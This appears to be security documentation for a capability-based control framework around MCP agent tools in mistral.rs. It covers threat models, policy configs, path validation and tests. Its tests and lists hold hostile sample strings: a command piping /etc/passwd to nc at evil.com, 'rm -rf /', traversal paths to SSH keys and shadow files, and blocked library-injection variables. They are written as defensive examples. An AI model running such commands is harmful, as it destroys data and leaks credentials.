# MCP Security Framework Documentation

## Executive Summary

This document describes the comprehensive capability-based security controls implemented for the mistral.rs MCP (Model Context Protocol) agent framework. The security system addresses critical vulnerabilities identified in the original implementation, including unrestricted filesystem access, lack of input validation, and absence of audit logging.

## Threat Model

### Attack Vectors

1. **Path Traversal (CWE-22)**

   - Attackers attempting to access files outside intended directories using `../` sequences
   - Symbolic link exploitation to bypass directory restrictions
   - Unicode and encoding attacks to obfuscate paths

1. **Command Injection (CWE-78)**

   - Injection of shell metacharacters in tool arguments
   - Process spawning with malicious environment variables
   - Execution of arbitrary binaries through MCP servers

1. **SQL Injection (CWE-89)**

   - Malicious SQL patterns in tool arguments
   - Second-order SQL injection through stored data

1. **Server-Side Request Forgery (CWE-918)**

   - Access to internal network resources
   - Port scanning via HTTP requests
   - Cloud metadata service exploitation

1. **Resource Exhaustion (CWE-400)**

   - Denial of service through excessive tool calls
   - Memory exhaustion via large file operations
   - CPU exhaustion through compute-intensive operations

1. **Information Disclosure (CWE-200)**

   - Exposure of sensitive environment variables
   - Leakage of filesystem structure
   - Credential exposure in logs

## Security Architecture

### Defense-in-Depth Layers

```
┌─────────────────────────────────────────┐
│         Application Layer               │
│     (Tool Calling Interface)            │
├─────────────────────────────────────────┤
│      Security Validation Layer          │
│  (Input Sanitization, Path Validation)  │
├─────────────────────────────────────────┤
│       Capability Control Layer          │
│  (Policy Enforcement, Rate Limiting)    │
├─────────────────────────────────────────┤
│        Transport Security Layer         │
│   (TLS, Authentication, Encryption)     │
├─────────────────────────────────────────┤
│         Process Isolation Layer         │
│    (Sandboxing, Resource Limits)        │
└─────────────────────────────────────────┘
```

### Security Policies

Each MCP server can have a customized security policy with the following components:

1. **Filesystem Policy**

   - Allowlisted directories
   - Blocklisted paths
   - File extension restrictions
   - Size limits
   - Permission controls (read/write/delete)

1. **Process Policy**

   - Command allowlists/blocklists
   - Argument validation patterns
   - Shell execution controls
   - Resource limits

1. **Network Policy**

   - URL pattern matching
   - Protocol restrictions
   - Port limitations
   - Private IP blocking

1. **Environment Policy**

   - Variable allowlists/blocklists
   - Sanitization rules
   - Passthrough controls

1. **Rate Limiting Policy**

   - Requests per minute
   - Concurrent operations
   - Total operation limits

1. **Audit Policy**

   - Operation logging
   - Failure tracking
   - Sensitive access monitoring

## Implementation Details

### Path Validation Algorithm

```rust
// Pseudocode for path validation
fn validate_path(path: &str) -> Result<PathBuf> {
    // 1. Check for traversal patterns
    if contains_traversal_pattern(path) {
        return Err("Path traversal detected");
    }

    // 2. Canonicalize path
    let canonical = canonicalize(path)?;

    // 3. Verify against allowlist
    if !is_in_allowed_paths(canonical) {
        return Err("Path not in allowed directories");
    }

    // 4. Check against blocklist
    if is_in_blocked_paths(canonical) {
        return Err("Path is explicitly blocked");
    }

    // 5. Validate file extension
    if !is_allowed_extension(canonical) {
        return Err("File extension not allowed");
    }

    Ok(canonical)
}
```

### Input Sanitization Patterns

The system detects and blocks various injection patterns:

- **SQL Injection**: `SELECT`, `INSERT`, `DROP`, `--`, `/*`, etc.
- **Command Injection**: `;`, `|`, `` ` ``, `$()`, `&&`, `||`, etc.
- **Path Traversal**: `../`, `..\\`, `%2e%2e`, `~`, etc.
- **Script Injection**: `<script>`, `javascript:`, `eval()`, etc.

### Environment Variable Sanitization

```rust
// Dangerous variables that are always blocked
const BLOCKED_VARS: &[&str] = &[
    "LD_PRELOAD",           // Linux library injection
    "LD_LIBRARY_PATH",      // Library path manipulation
    "DYLD_INSERT_LIBRARIES", // macOS library injection
    "PATH",                 // Command path manipulation (if not explicitly allowed)
];

// Variables containing sensitive patterns
const SENSITIVE_PATTERNS: &[&str] = &[
    "pass", "pwd", "key", "token",
    "secret", "api", "auth", "credential"
];
```

## Security Configuration Examples

### Restrictive Policy (Untrusted Servers)

```json
{
  "security_policy": {
    "filesystem": {
      "allowed_paths": [],
      "blocked_paths": ["*"],
      "allow_write": false,
      "allow_delete": false
    },
    "process": {
      "allowed_commands": [],
      "allow_shell": false
    },
    "network": {
      "allowed_protocols": ["https"],
      "block_private_ips": true,
      "block_loopback": true
    },
    "strict_mode": true
  }
}
```

### Moderate Policy (Semi-Trusted)

```json
{
  "security_policy": {
    "filesystem": {
      "allowed_paths": ["/tmp/sandbox"],
      "allowed_extensions": [".txt", ".json"],
      "max_file_size": 10485760,
      "allow_write": true,
      "allow_delete": false
    },
    "process": {
      "allowed_commands": ["echo", "cat", "ls"],
      "allow_shell": false
    },
    "network": {
      "allowed_protocols": ["https", "http"],
      "allowed_ports": [80, 443],
      "block_private_ips": true
    }
  }
}
```

### Permissive Policy (Trusted Internal)

```json
{
  "security_policy": {
    "filesystem": {
      "allowed_paths": ["/home/user/projects"],
      "blocked_paths": ["/etc/shadow", "/etc/passwd"],
      "allow_write": true,
      "allow_delete": true
    },
    "process": {
      "blocked_commands": ["rm -rf /"],
      "allow_shell": true
    },
    "network": {
      "block_private_ips": false,
      "block_loopback": false
    },
    "strict_mode": false
  }
}
```

## Security Best Practices

### 1. Principle of Least Privilege

- Start with the most restrictive policy
- Only grant permissions explicitly required
- Use server-specific policies over global ones
- Regularly review and audit permissions

### 2. Defense in Depth

- Apply multiple layers of security controls
- Don't rely on a single security mechanism
- Combine preventive and detective controls
- Implement fail-secure defaults

### 3. Input Validation

- Validate all inputs at entry points
- Use allowlists over blocklists where possible
- Sanitize data before use
- Reject malformed or suspicious inputs

### 4. Audit and Monitoring

- Log security-relevant events
- Monitor for anomalous behavior
- Regularly review audit logs
- Set up alerts for security violations

### 5. Secure Defaults

- Default to restrictive policies
- Require explicit opt-in for dangerous operations
- Use secure communication protocols
- Enable security features by default

## Compliance Mapping

### OWASP Top 10 (2021)

| Category                       | Coverage                                  |
| ------------------------------ | ----------------------------------------- |
| A01: Broken Access Control     | ✅ Path validation, capability controls   |
| A02: Cryptographic Failures    | ✅ TLS enforcement, credential protection |
| A03: Injection                 | ✅ Input sanitization, parameterization   |
| A04: Insecure Design           | ✅ Secure-by-default, least privilege     |
| A05: Security Misconfiguration | ✅ Secure defaults, validation            |
| A06: Vulnerable Components     | ⚠️ Dependency scanning (external)         |
| A07: Authentication Failures   | ✅ Bearer token validation                |
| A08: Data Integrity            | ✅ Path canonicalization                  |
| A09: Security Logging          | ✅ Comprehensive audit logging            |
| A10: SSRF                      | ✅ Network policy, IP filtering           |

### CIS Controls

- **CIS 3**: Data Protection - File access controls
- **CIS 4**: Secure Configuration - Policy enforcement
- **CIS 6**: Access Control - Capability-based security
- **CIS 8**: Audit Log Management - Comprehensive logging
- **CIS 12**: Network Monitoring - Request tracking

## Migration Guide

### From Insecure to Secure Configuration

1. **Identify Current MCP Servers**

   - List all configured MCP servers
   - Document their required capabilities
   - Assess trust levels

1. **Create Security Policies**

   - Start with restrictive template
   - Add specific permissions as needed
   - Test functionality incrementally

1. **Update Configuration**

   - Replace `MCP_CONFIG.json` with secure version
   - Add security policies to each server
   - Configure global fallback policy

1. **Test and Validate**

   - Verify all required functionality works
   - Check audit logs for violations
   - Adjust policies as needed

1. **Monitor and Maintain**

   - Regular security reviews
   - Update policies for new threats
   - Audit access patterns

## Testing Security Controls

### Path Traversal Tests

```rust
#[test]
fn test_path_traversal_blocked() {
    let validator = PathValidator::new(policy);
    assert!(validator.validate_path("../etc/passwd").is_err());
    assert!(validator.validate_path("/tmp/../etc/shadow").is_err());
    assert!(validator.validate_path("~/.ssh/id_rsa").is_err());
}
```

### Injection Tests

```rust
#[test]
fn test_command_injection_blocked() {
    let sanitizer = InputSanitizer::new();
    assert!(sanitizer.sanitize("rm -rf /; echo done").is_err());
    assert!(sanitizer.sanitize("cat /etc/passwd | nc evil.com 1234").is_err());
}
```

### Rate Limiting Tests

```rust
#[test]
async fn test_rate_limiting() {
    let client = create_rate_limited_client(max_per_minute: 10);

    // Should succeed for first 10 calls
    for _ in 0..10 {
        assert!(client.call_tool("test", args).await.is_ok());
    }

    // 11th call should be rate limited
    assert!(client.call_tool("test", args).await.is_err());
}
```

## Security Incident Response

### Detection

1. Monitor audit logs for:

   - Failed validation attempts
   - Rate limit violations
   - Access to blocked resources
   - Suspicious argument patterns

1. Set up alerts for:

   - Multiple failed attempts
   - Unusual access patterns
   - Policy violations

### Response

1. **Immediate Actions**

   - Block affected server/tool
   - Review audit logs
   - Assess impact

1. **Investigation**

   - Identify attack vector
   - Determine scope
   - Collect evidence

1. **Remediation**

   - Patch vulnerabilities
   - Update security policies
   - Strengthen controls

1. **Recovery**

   - Restore normal operations
   - Verify security controls
   - Document lessons learned

## Future Enhancements

### Planned Features

1. **Dynamic Policy Updates**

   - Runtime policy modification
   - Hot-reload without restart
   - Policy versioning

1. **Machine Learning Detection**

   - Anomaly detection
   - Behavioral analysis
   - Adaptive rate limiting

1. **Enhanced Sandboxing**

   - Container isolation
   - WASM runtime for tools
   - Resource quotas

1. **Cryptographic Controls**

   - Tool response signing
   - Encrypted audit logs
   - Secure key management

1. **Compliance Automation**

   - Policy compliance scanning
   - Automated remediation
   - Compliance reporting

## Security Contacts

For security issues or questions:

- **Security Team**: security@mistral.rs
- **Bug Bounty**: https://mistral.rs/security/bounty
- **CVE Reporting**: Use responsible disclosure process

## References

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls v8](https://www.cisecurity.org/controls/)
- [Model Context Protocol Specification](https://github.com/anthropics/model-context-protocol)

______________________________________________________________________

*Last Updated: 2025-01-03*
*Version: 1.0.0*
*Classification: PUBLIC*
